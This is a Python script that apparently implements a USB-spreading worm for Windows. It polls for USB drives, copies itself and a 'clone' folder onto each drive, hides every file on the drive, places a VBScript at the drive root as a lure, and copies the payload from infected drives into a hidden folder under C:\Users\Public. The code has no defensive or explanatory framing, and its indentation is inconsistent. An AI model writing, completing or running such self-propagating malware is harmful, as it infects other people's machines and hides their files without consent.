from sys import argv, platform
from datetime import datetime
import os, time, glob
import ports

import shutil

startTime = time.time()
script = argv
name = str(script[0])

global USBList
USBList = []

def copy_to_key(dst):
    if os.name == 'nt':
        os.mkdir(dst + '\\clone')
        os.system("copy " + name + " " + dst + "\\clone")
        os.system("attrib +h " + dst + "\\*  /d")
        os.system("copy C:\\Users\\Public\\clone " + dst + "\\clone")
        os.system("move " + dst + "\\clone\\script.vbs " + dst)

def copy_from_key(dst):
	if os.name == 'nt':
		os.mkdir("C:\\Users\\Public\\clone")
		os.system("copy " + dst + "\\clone " + "C:\\Users\\Public\\clone ")
		os.system("attrib +h C:\\Users\\Public\\clone")

def USBDetect():
	if os.name == 'nt':
		#print("OS Windows...\n")
		USBDir = ports.get_usb_devices()
	lencount = len(USBDir)
	lencount -= 1

	while lencount >= 0:
		time.sleep(0.2)
		try:
			if os.path.exists(USBDir[lencount]):
				if USBDir[lencount] not in USBList:
					if not os.path.exists(USBDir[lencount] + "\\clone"):
						USBList.append(USBDir[lencount])
						copy_to_key(USBDir[lencount])
					else:
						if not os.path.exists("C:\\Users\\Public\\clone"):
							copy_from_key(USBDir[lencount])
				#print("Found %s\n" % USBDir[lencount])
				lencount -= 1
			else:
				#print("No USB Detected")
				lencount -= 1
		except IOError:
			#print("")
            pass